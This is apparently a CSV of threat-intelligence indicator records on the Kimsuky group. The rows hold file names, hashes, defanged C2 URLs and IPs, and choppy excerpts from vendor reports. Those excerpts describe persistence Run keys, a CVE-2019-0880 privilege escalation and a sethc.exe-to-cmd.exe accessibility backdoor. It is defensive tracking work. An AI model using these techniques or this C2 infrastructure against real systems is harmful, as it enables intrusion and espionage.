1.0.0,actor--kimsuky,artifact--sha256:bb4dc7953c85f1eec64d0c48d29c8eb8e78e4aa241f2e391539f66942274d680,observation--sha256:1411f39c4a05c3210fd316957cc41914ab8b6240d6e19e85dbf2ac203d5d6166,file-name,show(2).php,show(2).php,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 7 HackTool/Win.RdpScan (2021.08.17.03) 64c97f485939ed66b13df5d7880d0757 result.lnk Backdoor/Win.AppleSeed (2022.06.22.01) 9b5add63dc12bc6c7028c6abf08c6ffd 6b3235a4c55aba4f6ffbf6f86f9c31e6 Dropper/LNK.Kimsuky.S2172 (2023.03.22.00) first (2).txt 74f1f1ba400ab3a0882927f81e3ea62e d.php Infostealer/Script.Agent (2023.10.19.01) shadow.exe Malware/PS.Generic.SC180735 (2023.10.18.01) viso.exe 7175e046767725b2f8d93f8a69a9999f 71f8ac92adf5af2357594446e85db30a Trojan/VBS.Kim,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:7b4740c6a532d4bb70cdcc73888f6886505001960255d5c02a157528132fb458,observation--sha256:5e5d2988090551f9fed084fe8f7d3005dcf159822b02d15efa3ecf69e200edd6,file-name,show.php,show.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 38}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"[+] (Ministry of Unification) North Korea Information Portal: ua.zip hxxps://nkinfo.unikorea.go.kr/nkp/term/skNkItTerm.do?pageIndex=32 (Table 15) At the time of recognizing the purpose of the Cook folder, namastte, only show.php existed, so it was difficult to determine the exact upload method or its relationship with other files, but it was confirmed in the analysis of other cases. Malware that uses show.php is shown below (Figure 26). I found a North Korean expression in the comments of index.",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:7b4740c6a532d4bb70cdcc73888f6886505001960255d5c02a157528132fb458,observation--sha256:0a3f46ec5f1ee16c31bfe9d1163034443309a37b4fdf302bd39bddd48ad91445,file-name,show.php,show.php,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 7 HackTool/Win.RdpScan (2021.08.17.03) 64c97f485939ed66b13df5d7880d0757 result.lnk Backdoor/Win.AppleSeed (2022.06.22.01) 9b5add63dc12bc6c7028c6abf08c6ffd 6b3235a4c55aba4f6ffbf6f86f9c31e6 Dropper/LNK.Kimsuky.S2172 (2023.03.22.00) first (2).txt 74f1f1ba400ab3a0882927f81e3ea62e d.php Infostealer/Script.Agent (2023.10.19.01) shadow.exe Malware/PS.Generic.SC180735 (2023.10.18.01) viso.exe 7175e046767725b2f8d93f8a69a9999f 71f8ac92adf5af2357594446e85db30a Trojan/VBS.Kim,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:45efe144f8c3c34dc2c9bb8b0c0d8d4274bb619dfe7bb4c0ac228ac226453614,observation--sha256:8d0c26a48d07cf674cdc9c3a1a367358c8e704eb1f6130e4a7f4714ec61fdcc0,file-name,signature).pif,signature).pif,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Operation Covert Stalker Report 9 auto_n.php HackTool/Win.RdpScan (2021.08.17.03) e840bf3477150392720fe8a9b1f8a4d6 result.txt.lnk fff43c6690eb87eb194aae01d6d77f1e dd6b31c3a9881eb64b719568a53cb2fb enc(2).txt North Korea's position on the use of nuclear weapons and Trojan/Win32.NsSpy (2017.09.14.00) Kang Jeong-il, authoritarianism HackTool/Script.Agent.SC193455 (2023.10.19.00) f082f689394ac71764bca90558b52c4e RdpAttack_Ksb04_x64.exe index.php tmp1030574661.vbs enc.txt f2bf557f8e90522d67b773d56a898",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:0d5fa1b4fa93dc9c863431d84af002afbcf1ec02202c7bfd56a734d9a40c7a85,observation--sha256:6e6783bcc5d86c55f8751648571ddeb91515358dbd87f8a4f750f6cdeee88d2b,file-name,sihost.exe,sihost.exe,candidate,2022-03-01T00:00:00Z,month,known,same-record,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 54}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.8. 경로및파일명유사도 ○VBS 1 유형부터JSE 3 유형까지는동일한레지스트리경로및레지스트리이름을사용했으며, JSE 4 유형부터 “Document” 가 아닌 “Update” 라는 레지스트리 이름을사용하고있습니다. ○또한, DAT, VBS, JSE 파일의이름및저장경로에서높은유사도를보이고있으며,JSE2유형부터는JSE파일명과경로에변화를준사실을확인할수있습니다. [표4-2] 경로및파일명유사도 Genians SecurityCenter 53 유형 탐지날짜 CHM파일명 레지스트리경로 DAT파일경로 VBS/ JSE파일경로 페이로드경로 VBS1 2022-03 User Guide.chmasset.chmwages.chm HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Document %USERPROFILE%\Links\Document.dat %USERPROFILE%\Links\Document.vbs %tmp%\a",
1.0.0,actor--kimsuky,artifact--sha256:a7321f1f2ee4d2107f531e548b2f8dab7ce13008137b6a6e22904f97e781df89,observation--sha256:0f1b6d39d6446c698cface2c93eaa5c767a2f8edb33a3afb5ebeb538151a9062,file-name,skin.lib.php,skin.lib.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"ÿ navernail.eu/ewf43fewfwf4tfw4/wf7weyr892hfwogewgsfg3.php 27.255.80.170(KR) 27.102.114.89(KR) 216.189.149.71(US) ÿ www.ssktool.co.kr/ssktool/20090401skin/chinese/quick/L_quick.php 59.7.91.171(KR) ÿ www.namastte.kr/sources/Util/AJAX.php 211.53.197.220(KR) 27.255.75.137(KR) We contacted the site administrator by email to analyze the cause of the upload, but we did not receive any feedback. Operation Covert Stalker Report 1.243.200.130(KR) 185.176.43.106(BG) 27.102.107.63(KR) 27.255.81.80(KR) 162.",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:a7321f1f2ee4d2107f531e548b2f8dab7ce13008137b6a6e22904f97e781df89,observation--sha256:106f3aa78b7ad27efbe98193762b4e253ca64d8b12981a5181649aa1de4d0e9d,file-name,skin.lib.php,skin.lib.php,candidate,2023-01-02T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 72}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Data MAL_BLOCK LOG_ID_WEB_ 20221031154004 I confirmed accessing the uploaded webshell URL. (See Table 39 below) msedge.exe 10:55:54 LOG_ID_WEB_ malware_path copycount.co.kr/pma/themes/original/skin.lib.php MAL_BLOCK diagnosis (Table 38) Webshell URL access blocking log of 22*.15*.24*.13*(KR) Operation Covert Stalker Report MAL_BLOCK 20221129154036 uemotion/user/data/cheditor4/1404/log&fopen=sqlite.zip IP filtering is applied to list.php used by some C2s built by the Kimsuky organization for the ,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:3620dd0b54273d71eadd6bbf3e2d56f49f4e1baa5fcf6a77eb4406a4648ecfe2,observation--sha256:f9ccb27fa6db80e29a803eb262e34ce343c9bc8a6902c9b76a04594c048edddb,file-name,smss.exe,smss.exe,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 47}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○악성매크로는HEX값을통해난독화되어있으며, Powershell 코드와파일저장경로및레지스트리경로등에서CHM공격과의유사성을보이고있습니다. [그림4-22] 악성매크로코드 ○분석시점에C2서버에접속이불가하여최종다운로드되는“smss.exe” 파일은확보하지못했지만RAT또는Backdoor 유형의악성코드로추정하고있습니다. Genians SecurityCenter 46",
1.0.0,actor--kimsuky,artifact--sha256:8658b521c083296ef31918f02776f8a1697812ce8b60913470c5bddac0fa32bc,observation--sha256:045095bcbad803beadfedbaec8e12891a6a9fdd42ecc3879a052b9f8f59758f2,file-name,spec.docm,spec.docm,candidate,2019-02-14T00:00:00Z,day,known,same-record,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 20}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,[그림 9-1] Document created by 'John Harvey' is modified by 'windowsmb' File Name OFT.docm Last Modified Date (KST) 2019-02-14 23:08 Last Modified Name JamFedura C2 http://192.186.142[.]74/cache/Fwvuj0.hta MD5 304d86463a1fff5183aacc17ef2b3730 File Name bot spec.docm Last Modified Date (KST) 2019-02-18 17:30 Last Modified Name JamFedura C2 http://192.186.142[.]74/mn/Xtgnb0.hta MD5 f816a9c4a3415e8bae807c09e0f80b38 File Name white_paper.doc Last Modified Date (KST) 2019-02-19 17:29 Last Modified Name,
1.0.0,actor--kimsuky,artifact--sha256:612e235e5508c8bc40e2cd575be9178cb528bb750b41fb721dc5163d1f4d2528,observation--sha256:f7fe61e1b350d9576c53e9a9e792fe3f3c724d7256280edab6a22cefb17f97f2,file-name,speed1.dll,speed1.dll,candidate,2021-07-01T00:00:00Z,month,inferred,report-observation-window,2021-07-01T00:00:00Z,source--kgh-2021,kimsuky/Kimsuky-KGH.pdf,"{""page"": 6}",[],"[""malware--kgh""]","[""infra--compromised-web-servers""]","[""c2"",""payload""]",0,false,high,TLP:CLEAR,pdf-text,"微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 图[5] . 向系统目录拷贝 如果复制成功将会直接执行，否则会检查 speed3.exe 路径是否包含 Low 字符串，如果 不包含，则会复制到 C:\Users\<user>\AppData\Local\comhost.exe 执行，并以字符串""Level Medium-->Path""作为日志标识。 如 果 包 含 Low 字 符 串 ， 则 会 利 用 漏 洞 CVE_2019_0880 进 行 提 权 ， 将%Temp%\speed1.dll 通过注入的方式以高权限执行。 图[6] . 漏洞 CVE_2019_0880 expolit 反汇编代码片段 被 注 入 执 行 的 speed1.dll ， 从 Temp 目 录 寻 找 %Temp%\low\pay.exe 或 者 %Temp%\pay.exe （ 间 谍 模 块 ） ， 将 其 复 制 到 C:\Users\<user>\AppData\Local\comhost.exe 并执行。",
1.0.0,actor--kimsuky,artifact--sha256:d379b8443f76cd664dc022be8b567f6ef6826da965590cc7bbd9c0a5a78c52b6,observation--sha256:c529f9ada27f7787681a34aa605a83bf7eda2bc548d56f5f3b8e8c68838fcb77,file-name,speed1.exe,speed1.exe,candidate,2021-07-01T00:00:00Z,month,inferred,report-observation-window,2021-07-01T00:00:00Z,source--kgh-2021,kimsuky/Kimsuky-KGH.pdf,"{""page"": 5}",[],"[""malware--kgh""]","[""infra--compromised-web-servers""]","[""c2"",""payload""]",0,false,high,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 3.2 第二阶段：木马安装 攻击者前后开发了多个类似的木马，作者观察到在部分组件中携带有 Pdb 路径，疑似 多名开发者协同工作。 D:\MyWork\PrevWork\ 취 약 점 자 료 \IE\2021\Work\Final\splwow64_poc\x64\Release\splwow64_poc.pdb D:\MyWork\PrevWork\ 취 약 점 자 료 \IE\2021\Work\Final\splwow64_poc\x64\Release\DLL.pdb I:\splwow64_poc\Release\CreateDC.pdb I:\splwow64_poc\x64\Release\DLL.pdb C:\Users\Administrator\Downloads\Win32Project1\x64\Release\Win32Project1.pdb X:\MyWork\PrevWork\VC Attack Program\MakeMail\Release\MakeMail.,
1.0.0,actor--kimsuky,artifact--sha256:bce349b54ae29c2d4e5c9b1a00ed01b04b5e96317af997cdca98b7a58d0f3d48,observation--sha256:69ad57b399201838f08e52ae6e36f6a77bfaa8ebfca62cc55f9539f54ffcaae7,file-name,speed3.exe,speed3.exe,candidate,2021-07-01T00:00:00Z,month,inferred,report-observation-window,2021-07-01T00:00:00Z,source--kgh-2021,kimsuky/Kimsuky-KGH.pdf,"{""page"": 5}",[],"[""malware--kgh""]","[""infra--compromised-web-servers""]","[""c2"",""payload""]",0,false,high,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 3.2 第二阶段：木马安装 攻击者前后开发了多个类似的木马，作者观察到在部分组件中携带有 Pdb 路径，疑似 多名开发者协同工作。 D:\MyWork\PrevWork\ 취 약 점 자 료 \IE\2021\Work\Final\splwow64_poc\x64\Release\splwow64_poc.pdb D:\MyWork\PrevWork\ 취 약 점 자 료 \IE\2021\Work\Final\splwow64_poc\x64\Release\DLL.pdb I:\splwow64_poc\Release\CreateDC.pdb I:\splwow64_poc\x64\Release\DLL.pdb C:\Users\Administrator\Downloads\Win32Project1\x64\Release\Win32Project1.pdb X:\MyWork\PrevWork\VC Attack Program\MakeMail\Release\MakeMail.,
1.0.0,actor--kimsuky,artifact--sha256:bce349b54ae29c2d4e5c9b1a00ed01b04b5e96317af997cdca98b7a58d0f3d48,observation--sha256:8c3bda012528b527111f981ea0de9406b716d62d8a8db8faa548b647d1b91061,file-name,speed3.exe,speed3.exe,candidate,2021-07-01T00:00:00Z,month,inferred,report-observation-window,2021-07-01T00:00:00Z,source--kgh-2021,kimsuky/Kimsuky-KGH.pdf,"{""page"": 6}",[],"[""malware--kgh""]","[""infra--compromised-web-servers""]","[""c2"",""payload""]",0,false,high,TLP:CLEAR,pdf-text,"微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 图[5] . 向系统目录拷贝 如果复制成功将会直接执行，否则会检查 speed3.exe 路径是否包含 Low 字符串，如果 不包含，则会复制到 C:\Users\<user>\AppData\Local\comhost.exe 执行，并以字符串""Level Medium-->Path""作为日志标识。 如 果 包 含 Low 字 符 串 ， 则 会 利 用 漏 洞 CVE_2019_0880 进 行 提 权 ， 将%Temp%\speed1.dll 通过注入的方式以高权限执行。 图[6] . 漏洞 CVE_2019_0880 expolit 反汇编代码片段 被 注 入 执 行 的 speed1.dll ， 从 Temp 目 录 寻 找 %Temp%\low\pay.exe 或 者 %Temp%\pay.exe （ 间 谍 模 块 ） ， 将 其 复 制 到 C:\Users\<user>\AppData\Local\comhost.exe 并执行。",
1.0.0,actor--kimsuky,artifact--sha256:15e8823bf97b04fc78bf5ff32cefb3cb819b7ca830f61ea0ba8825d1b123946f,observation--sha256:3bf6e0a64efaa77b2acd4f482417f34ed090a03ed6800d6cc95ecfc2e9d56da9,file-name,splwow64_poc.pdb,splwow64_poc.pdb,candidate,2021-07-01T00:00:00Z,month,inferred,report-observation-window,2021-07-01T00:00:00Z,source--kgh-2021,kimsuky/Kimsuky-KGH.pdf,"{""page"": 5}",[],"[""malware--kgh""]","[""infra--compromised-web-servers""]","[""c2"",""payload""]",0,false,high,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 3.2 第二阶段：木马安装 攻击者前后开发了多个类似的木马，作者观察到在部分组件中携带有 Pdb 路径，疑似 多名开发者协同工作。 D:\MyWork\PrevWork\ 취 약 점 자 료 \IE\2021\Work\Final\splwow64_poc\x64\Release\splwow64_poc.pdb D:\MyWork\PrevWork\ 취 약 점 자 료 \IE\2021\Work\Final\splwow64_poc\x64\Release\DLL.pdb I:\splwow64_poc\Release\CreateDC.pdb I:\splwow64_poc\x64\Release\DLL.pdb C:\Users\Administrator\Downloads\Win32Project1\x64\Release\Win32Project1.pdb X:\MyWork\PrevWork\VC Attack Program\MakeMail\Release\MakeMail.,
1.0.0,actor--kimsuky,artifact--sha256:f76c03851a1337578c203dd5b2697240fb4271ce787cd6754057136254f369d3,observation--sha256:d4ed9f6283657c0e1d9a2753f675768911967605118508663bc9ee15a529d15a,file-name,sqlite.zip,sqlite.zip,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 38}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"[+] (Ministry of Unification) North Korea Information Portal: ua.zip hxxps://nkinfo.unikorea.go.kr/nkp/term/skNkItTerm.do?pageIndex=32 (Table 15) At the time of recognizing the purpose of the Cook folder, namastte, only show.php existed, so it was difficult to determine the exact upload method or its relationship with other files, but it was confirmed in the analysis of other cases. Malware that uses show.php is shown below (Figure 26). I found a North Korean expression in the comments of index.",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:f76c03851a1337578c203dd5b2697240fb4271ce787cd6754057136254f369d3,observation--sha256:979abd51b55cc46d69dcd400d57db52d76daaa82b34add54c3356420b0a41c96,file-name,sqlite.zip,sqlite.zip,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 39}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"It has the same structure, and the malicious code downloaded varies depending on the number attached to list.php and lib.php. This means that both PHPs have malware file names mapped to numbers followed by them. Also, sqlite.zip is a file that the malicious code mapped to the number attached to the end of the file downloads additionally for normal execution. On March 20, 2023, a joint security advisory issued by the National Intelligence Service (NIS) and the German Constitutional Protection Age",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:f76c03851a1337578c203dd5b2697240fb4271ce787cd6754057136254f369d3,observation--sha256:d420dbbeb9954c08be14a781f28f89f94baf3a05de6d7796fd779920f340db71,file-name,sqlite.zip,sqlite.zip,candidate,2023-01-02T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 72}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Data MAL_BLOCK LOG_ID_WEB_ 20221031154004 I confirmed accessing the uploaded webshell URL. (See Table 39 below) msedge.exe 10:55:54 LOG_ID_WEB_ malware_path copycount.co.kr/pma/themes/original/skin.lib.php MAL_BLOCK diagnosis (Table 38) Webshell URL access blocking log of 22*.15*.24*.13*(KR) Operation Covert Stalker Report MAL_BLOCK 20221129154036 uemotion/user/data/cheditor4/1404/log&fopen=sqlite.zip IP filtering is applied to list.php used by some C2s built by the Kimsuky organization for the ,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:2cace45e1598c5948235e2d8174ca7b010f3e6cb770cde5615728871ce3795b7,observation--sha256:9cf5171c06467bf50c476327fdf76850edf95dd964042474cd2e4654f8e4829f,file-name,submit.php,submit.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--030e0bafc14e2552,kimsuky/APTDown/article.txt,"{""line"": 535}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,HttpPostUri - /submit.php,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9181da5c11b51e2033ca20a66fba692b974f21bd9bf9e9b13351afb3574059d4,observation--sha256:4c4e89e908b8e44c1f32a1ac3e73399f83567b68f57564005b20f784071082e2,file-name,svchost.exe,svchost.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 RdpScan_A01.exe dpscan.pdb D:\Wrk\RDP\Report\puma\RdpScan_2019\src\vs15\x64\Release\r Operation Covert Stalker Report [+] Malicious code from scanner number 1 set.hta, which mshta.exe downloads and runs, is added to IFEO (Image File Execution Options) in the registry. sethc.exe.bak&copy cmd.exe sethc.exe"" This method has been around for a long time, meaning that the user can run a different file than the one they were trying to run. I have configured the site as below to download and run the s",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9181da5c11b51e2033ca20a66fba692b974f21bd9bf9e9b13351afb3574059d4,observation--sha256:d0005ee032a3a3c423ffa90042d373f63c81947724939da8e7e655facfff2846,file-name,svchost.exe,svchost.exe,candidate,2023-07-14T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 26}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Detect attempts to svchost.exe N/A (Table 6) Behavior log of Ammy RAT installation process 17:12:05 Operation Covert Stalker Report Target Process rundll32.exe Creates executable file ntrol\SafeBoot\Network\ts 2023-07-14 cmd.exe svchost.exe N/A It is Fileless. Connects to network 188.42.129.148:80(LU) aa_nts.dll Behavior 2) BlackBit ransomware infection svchost.exe process Report Time 17:12:03 Target aa_nts.dll (Ammy RAT) kmanager N/A 2023-07-14 N/A (Figure 15) File structure of BlackBit ransomw,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9181da5c11b51e2033ca20a66fba692b974f21bd9bf9e9b13351afb3574059d4,observation--sha256:bc46af6633bb7fd68b033adcee4f0b7ccefab0b4e7524c62916d6ec62f7f3a9e,file-name,svchost.exe,svchost.exe,candidate,2023-07-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"C:\Windows\winlogon.exe 22*.10*.1*.6* It was determined that the Kimsuky organization intentionally stored it in Tools for malicious purposes. z\x32\mimilove.exe %SystemDrive%\users\%ASD%\downloads\tools\x86.exe C:\Users\Administrator\Desktop\tools\Tools\tools\svchost.exe \Start Menu\Programs\Startup\winlogon.exe Second, the word Tools is commonly found in the diagnostic file path of BlackBit ransomware, shown in light red. C:\Users\Administrator\AppData\Roaming\winlogon.exe Operation Covert Sta",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9181da5c11b51e2033ca20a66fba692b974f21bd9bf9e9b13351afb3574059d4,observation--sha256:4316b97fc5880a5f9676a65f84af7d6e1d0e441ab0311ad7c75a811d423e26fe,file-name,svchost.exe,svchost.exe,candidate,2021-11-02T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 71}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"(2) certuser.info In the table below (Table 36), hxxp://bipaf.org is the C2 through which the malicious document (MD5: 90a56bc6a66bb4e02265389529757460) communicates, and namastte has been hacked by the Kimsuky organization since November 2021, before April 2022, which was recognized by AhnLab. Abuse with C2 (Table 36) Malicious behavior log of 21*.16*.25*.5*(KR) A total of 45 malicious URLs with similar patterns were mapped to 21*.9*.1*.16*(KR) where certuser.info was mapped. 71 22*.15*.24*.13*",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9181da5c11b51e2033ca20a66fba692b974f21bd9bf9e9b13351afb3574059d4,observation--sha256:40bee0d769cdfa4d31fd3432fb480df16399cc23516fa48624e30a967d6f1f2d,file-name,svchost.exe,svchost.exe,candidate,2023-07-14T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 85}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Connect to 17:24:22 211.249.220.24:443 (Table 48) Malware behavior log of 14*.10*.23*.21*(US) mshta.exe Operation Covert Stalker Report process 85 17:24:22 N/A N/A Submit v.doc.exe 2023-07-14 N/A It is designed to download and execute malicious code, but at the time of analysis, it is converted into a decoy file and malicious code as shown below (Figure 66). Deletes executable mshta.exe Myeon Golf Chairman.exe The malicious code in the above (Table 48), the malicious code disclosed on the ASEC b",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9181da5c11b51e2033ca20a66fba692b974f21bd9bf9e9b13351afb3574059d4,observation--sha256:c79d6bb7b7ba1cb1fb4bfab840e5860402e99090c678fe56e382980cd89ee6be,file-name,svchost.exe,svchost.exe,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Operation Covert Stalker Report 9 auto_n.php HackTool/Win.RdpScan (2021.08.17.03) e840bf3477150392720fe8a9b1f8a4d6 result.txt.lnk fff43c6690eb87eb194aae01d6d77f1e dd6b31c3a9881eb64b719568a53cb2fb enc(2).txt North Korea's position on the use of nuclear weapons and Trojan/Win32.NsSpy (2017.09.14.00) Kang Jeong-il, authoritarianism HackTool/Script.Agent.SC193455 (2023.10.19.00) f082f689394ac71764bca90558b52c4e RdpAttack_Ksb04_x64.exe index.php tmp1030574661.vbs enc.txt f2bf557f8e90522d67b773d56a898",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:e1c96b4039a18027c53cecb96898e72f883660f42b8354be9480b36dd8082d39,observation--sha256:fc3fa5f4237be32f4e4f19b31e3c18b0e968f014d7f56a4794374bdcc39a98ac,file-name,swolf-first.ps1,swolf-first.ps1,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--f2a5c395add9beae,kimsuky/rapid7-Kimsukys-Phishing-and-Payload-Tactics_wp.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,11 It is worthy to note that when double-clicking msc files on default windows systems there is a User Account Control (UAC) warning that may hinder an attack. Figure 10 - A CommandLine Task in the .msc In the screenshot above showing an MSC CommandLine Task payload: 1. Open Google Docs lure 2. Execute tasklist and write results to file 3. Echo VBScript to disk 4. Execute VBScript The VBScript in this example simply POSTs collected process information to the server. Despite this being a simple e,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:2e6eb18163d7007b0869f62cf8cb4b1bb2fdffcf7a721e7061dc7ffbedf647e8,observation--sha256:63cac6fe8364cab9355fedb55f8b2b6f3a01fef197dc28ef1168e01600b68e3f,file-name,synacktiv-pulseconnectsecure-multiple-vulnerabilities.pdf,synacktiv-pulseconnectsecure-multiple-vulnerabilities.pdf,candidate,2024-01-01T00:00:00Z,month,known,same-record,,source--kimsuky-corpus--030e0bafc14e2552,kimsuky/APTDown/article.txt,"{""line"": 934}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,[#11] https://www.synacktiv.com/sites/default/files/2024-01/synacktiv-pulseconnectsecure-multiple-vulnerabilities.pdf,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:ddfebc0343b81691780835e83b85a45af6d9ce45f24f560bff2bf719779f9123,observation--sha256:743232883def19dbb8a211c9a957d29cb7de51f2a8eb09ae326d43d1c67309ea,file-name,szgfj0.hta,szgfj0.hta,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 16}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,- http://seoulhobi[.]biz/how/fmaov0.hta - http://192.186.142[.]74/cache/fwvuj0.hta - http://192.186.142[.]74/cache/expres.php?op=1 - http://192.186.142[.]74/cache/expres.php?op=2 - http://192.186.142[.]74/cache/cow.php?op=exe.gif - http://192.186.142[.]74/cache/cow.php?op=cow.gif - http://192.186.142[.]74/cache/upload.php - http://192.186.142[.]74/mn/xtgnb0.hta - http://192.186.142[.]74/post/Yluhi0.hta - http://192.186.142[.]74/dll/Mylqn0.hta - http://192.186.142[.]74/lib/szgfj0.hta - http://192,
